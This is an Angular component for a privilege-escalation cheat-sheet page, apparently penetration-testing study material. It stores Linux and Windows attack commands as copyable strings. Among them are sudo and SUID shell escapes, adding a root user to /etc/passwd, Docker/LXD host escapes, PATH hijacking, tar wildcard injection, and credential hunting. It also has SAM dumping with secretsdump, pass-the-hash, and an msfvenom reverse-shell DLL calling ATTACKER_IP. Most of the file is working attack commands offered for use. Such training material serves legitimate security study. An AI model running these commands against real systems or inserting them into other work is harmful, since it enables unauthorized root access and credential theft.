import { Component, DestroyRef, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { MatExpansionModule } from '@angular/material/expansion';
import { ActivatedRoute, Router } from '@angular/router';
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
import { Terminal } from '../../shared/terminal/terminal';
import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';

@Component({
  selector: 'app-privesc',
  standalone: true,
  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent],
  templateUrl: './privesc.html',
  styleUrl: './privesc.scss',
})
export class Privesc implements OnInit {

  selected: string | null = 'linux';
  readonly systems: SectionIndexItem[] = [
    { id: 'linux', label: 'Linux PrivEsc' },
    { id: 'windows', label: 'Windows PrivEsc' }
  ];
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly destroyRef = inject(DestroyRef);

  ngOnInit(): void {
    this.route.queryParamMap
      .pipe(takeUntilDestroyed(this.destroyRef))
      .subscribe(params => {
        const system = params.get('system');
        if (system && this.systems.some(item => item.id === system)) this.selected = system;
      });
  }

  // =========================================================
  // LINUX PRIVESC
  // =========================================================

  basicEnumeration = `
id
whoami
groups
hostname
uname -a
uname -r
arch
cat /etc/issue
cat /etc/os-release
ps aux
env
`;

  sudoCheck = `
sudo -l
`;

  sudoHighRisk = `
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/bin/python
(root) NOPASSWD: /usr/bin/perl
(root) NOPASSWD: /usr/bin/tar *
`;

  sudoVim = `
sudo vim -c ':!/bin/bash'
`;

  sudoLess = `
sudo less /etc/passwd
!sh
`;

  sudoFind = `
sudo find . -exec /bin/sh \\; -quit
`;

  sudoAwk = `
sudo awk 'BEGIN {system("/bin/bash")}'
`;

  sudoPython = `
sudo python3 -c 'import os; os.system("/bin/bash")'
`;

  sudoPerl = `
sudo perl -e 'exec "/bin/bash";'
`;

  // =========================================================
  // PROCESS ENUMERATION
  // =========================================================

  processEnumeration = `
ps aux
ps -ef
ps auxww
`;

  processFilters = `
ps aux | grep root
ps aux | grep -E "python|bash|sh|perl|php"
ps aux | grep -i password
ps auxww | grep -v "\\["
`;

  processRedFlags = `
root  /usr/bin/python /opt/app/app.py --db-pass=admin123
root  /tmp/backup.sh
root  /home/user/service --token=abcd1234
`;

  // =========================================================
  // BASH HISTORY
  // =========================================================

  bashHistory = `
cat ~/.bash_history
cat /home/*/.bash_history
cat /root/.bash_history
`;

  bashHistorySearch = `
grep -i "password" ~/.bash_history
grep -i "ssh" ~/.bash_history
grep -i "wget" ~/.bash_history
grep -i "curl" ~/.bash_history
`;

  bashHistorySystem = `
find / -name ".bash_history" 2>/dev/null
find /home -type f -name ".bash_history" 2>/dev/null
`;

  // =========================================================
  // SUID
  // =========================================================

  suidEnumeration = `
find / -perm -u=s -type f 2>/dev/null
`;

  suidExample = `
find . -exec /bin/sh -p \\; -quit
`;

  // =========================================================
  // CAPABILITIES
  // =========================================================

  capabilities = `
getcap -r / 2>/dev/null
`;

  capabilitiesExample = `
/usr/bin/python = cap_setuid+ep
`;

  capabilitiesExploit = `
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
`;

  // =========================================================
  // CRON JOBS
  // =========================================================

  cronEnumeration = `
crontab -l
ls -lah /etc/cron*
cat /etc/crontab
`;

  // =========================================================
  // WRITABLE FILES
  // =========================================================

  writableFiles = `
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
`;

  // =========================================================
  // ETC PASSWD
  // =========================================================

  passwdPermissions = `
ls -l /etc/passwd
`;

  passwdHash = `
openssl passwd w00t
`;

  passwdInject = `
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
`;

  passwdSwitch = `
su root2

id
`;

  // =========================================================
  // KERNEL
  // =========================================================

  kernelEnumeration = `
uname -r
searchsploit linux kernel <version>
`;

  // =========================================================
  // DOCKER / LXD
  // =========================================================

  dockerGroups = `
id
groups
`;

  dockerEscape = `
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
`;

  lxdEscape = `
lxc init alpine privesc -c security.privileged=true

lxc config device add privesc root disk source=/ path=/mnt/root recursive=true

lxc start privesc

lxc exec privesc /bin/sh
`;

  // =========================================================
  // PATH HIJACKING
  // =========================================================

  pathRecon = `
echo $PATH
env | grep PATH
ps aux
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
systemctl list-timers --all
`;

  pathWritable = `
find / -writable -type d 2>/dev/null | grep -E "tmp|home|var"

echo $PATH | tr ":" "\\n"
`;

  pathHijack = `
echo -e '#!/bin/bash\\n/bin/bash' > ls

chmod +x ls

export PATH=/tmp:$PATH
`;

  // =========================================================
  // WILDCARD INJECTION
  // =========================================================

  wildcardExamples = `
sudo /usr/bin/tar -czvf /backup/backup.tar.gz *

sudo zip archive.zip *

sudo rsync -a * /backup/

sudo chown root:root *

sudo chmod 755 *
`;

  wildcardTar = `
touch -- "--checkpoint=1"

touch -- "--checkpoint-action=exec=bash shell.sh"

sudo tar -czvf /tmp/backup.tar.gz *
`;

  // =========================================================
  // PASSWORD HUNTING
  // =========================================================

  passwordHunting = `
grep -Ri "password" /home 2>/dev/null

cat ~/.bash_history

cat /var/www/html/config.php
`;

  sshKeys = `
find / -name id_rsa 2>/dev/null
`;

  sshKeyPermissions = `
chmod 600 id_rsa
`;

  sshLogin = `
ssh -i id_rsa user@target
`;

  sshKeyCrack = `
ssh2john id_rsa > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
`;

  // =========================================================
  // LD_PRELOAD
  // =========================================================

  ldPreloadCheck = `
sudo -l
`;

  ldPreloadCompile = `
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
`;

  ldPreloadExploit = `
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<binary>
`;

  // =========================================================
  // MENTAL FLOW
  // =========================================================

  oscpMentalFlow = `
1. id / groups
2. sudo -l
3. SUID
4. Capabilities
5. Cron jobs
6. Writable files
7. Docker / LXD
8. Kernel exploit
`;

  // =========================================================
  // WINDOWS PRIVESC
  // =========================================================

  windowsIdentity = `
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all
`;

  windowsUsersGroups = `
net user
net user username
net localgroup
net localgroup Administrators
net user /domain
net group /domain
`;

  windowsSystem = `
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk get caption,description
wmic product get name,version,vendor
`;

  windowsDrivers = `
driverquery /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer
`;

  windowsNetwork = `
ipconfig /all
route print
arp -a
mountvol
`;

  windowsCredentialHunting = `
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

dir /s *pass*
dir /s *cred*
dir /s *vnc*

dir /b /s unattend.xml
dir /b /s sysprep.inf
`;

  windowsRegistryCredentials = `
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKCU\\Software\\TightVNC\\Server"
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
`;

  windowsSavedCredentials = `
cmdkey /list
`;

  windowsPowerShellHistory = `
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

findstr /i password %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i user %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i net %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i cmdkey %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

doskey /history

type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
`;

  windowsInterestingFiles = `
dir /s /b *.txt
dir /s /b C:\\*.kdbx
dir /s /b *.config
dir /s /b *.conf
dir /s /b *.ini
dir /s /b *.xml
dir /s /b *.json
dir /s /b *.ps1
dir /s /b *.bat
dir /s /b *.cmd
dir /s /b *.docx
dir /s /b *.xlsx
dir /s /b *.pdf
dir /s /b *.zip
dir /s /b *.bak
dir /s /b *.old

dir /s /b *password*
dir /s /b *pass*
dir /s /b *cred*
dir /s /b *secret*
dir /s /b *config*
dir /s /b *backup*
dir /s /b *vpn*
dir /s /b *rdp*
dir /s /b *ssh*
dir /s /b *id_rsa*

findstr /spin "password" *
findstr /spin "passwd" *
findstr /spin "pwd" *
findstr /spin "username" *
findstr /spin "connectionstring" *
findstr /spin "apikey" *
findstr /spin "token" *
findstr /spin "secret" *

C:\\Users\\
C:\\Users\\Public\\
C:\\ProgramData\\
C:\\Temp\\
C:\\Windows\\Temp\\
C:\\inetpub\\
C:\\Scripts\\
C:\\Backup\\
C:\\Backups\\
C:\\Tools\\

web.config
app.config
applicationHost.config
Unattend.xml
sysprep.xml
sysprep.inf
`;

  // =========================================================
  // SERVICES
  // =========================================================

  windowsServices = `
sc query
sc qc ServiceName
wmic service get name,displayname,pathname,startmode

Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName
`;

  windowsUnquotedPaths = `
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

Get-CimInstance Win32_Service | Select Name,PathName,StartName
`;

  windowsServiceBinary = `
Get-CimInstance Win32_Service |
Where-Object {$_.StartName -like "*LocalSystem*"} |
Select Name, State, StartMode, StartName

icacls "C:\\Path\\To\\ServiceBinary.exe"

sc qc ServiceName
`;

  windowsServiceRule = `
WRITE + SYSTEM + EXECUTION TRIGGER = EXPLOIT
`;

  windowsDLLHijacking = `
icacls C:\\ServiceDirectory

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll

sc stop ServiceName
sc start ServiceName
`;

  // =========================================================
  // SCHEDULED TASKS
  // =========================================================

  windowsScheduledTasks = `
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State"

Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State

schtasks /query
schtasks /query /fo TABLE
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v > tasks.txt
`;

  windowsTaskFiltering = `
findstr /i "TaskName Author Run As User Task To Run" tasks.txt

findstr /i "powershell cmd.exe .ps1 .bat .cmd" tasks.txt

findstr /i "\\Microsoft\\" tasks.txt
`;

  windowsTaskInspect = `
schtasks /query /tn "\\TaskName" /fo LIST /v

Get-ScheduledTask

Get-ScheduledTask | Select TaskName,TaskPath,State

(Get-ScheduledTask "TaskName").Actions
`;

  windowsTaskFiles = `
dir C:\\ /s *.ps1
dir C:\\ /s *.bat
dir C:\\ /s *.cmd
dir C:\\ /s *.vbs
dir C:\\ /s *.xml
dir C:\\ /s *.config
dir C:\\ /s *.ini

dir C:\\Windows\\System32\\Tasks /s

findstr /spin "password passwd pwd secret token user uid connectionstring" *.xml *.config *.ini *.txt *.ps1 *.bat *.cmd
`;

  windowsTaskPermissions = `
icacls C:\\Path\\To\\TaskBinary.exe

icacls C:\\Path\\To\\Script.ps1

.\accesschk64.exe /accepteula -s -d C:\\Scripts\\
`;

  // =========================================================
  // SEIMPERSONATE
  // =========================================================

  windowsSeImpersonate = `
whoami /priv
`;

  windowsPotato = `
PrintSpoofer64.exe -i -c cmd

GodPotato.exe -cmd cmd
`;

  // =========================================================
  // BACKUP OPERATORS
  // =========================================================

  windowsBackupOperators = `
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system
`;

  windowsSecretsDump = `
impacket-secretsdump -sam sam -system system LOCAL
`;

  windowsPassTheHash = `
impacket-psexec -hashes :NTHASH Administrator@IP
`;

  // =========================================================
  // KERNEL
  // =========================================================

  windowsKernel = `
systeminfo
wmic qfe get HotFixID

searchsploit Windows <version>
`;

  // =========================================================
  // AUTOMATED ENUMERATION
  // =========================================================

  windowsAutomatedEnum = `
.\\winPEASx64.exe
.\\winPEAS.exe

Set-ExecutionPolicy Bypass -Scope Process -Force

Unblock-File .\\PowerUp.ps1
. .\\PowerUp.ps1
Invoke-AllChecks

Unblock-File .\\PrivescCheck.ps1
. .\\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report PrivescCheck.txt

.\\Seatbelt.exe -group=all
`;

  windowsManualVerify = `
icacls "C:\\Program Files\\..."

sc.exe qc ServiceName

schtasks /query /fo LIST /v

whoami /priv
`;

  // =========================================================
  // NAVIGATION
  // =========================================================

  selectTech(tech: string) {
    this.selected = tech;
    void this.router.navigate([], {
      relativeTo: this.route,
      queryParams: { system: tech },
      replaceUrl: true
    });
  }

  back() {
    this.selected = 'linux';
  }

  // =========================================================
  // COPY
  // =========================================================

  copy(text: string) {
    navigator.clipboard.writeText(text);
  }
}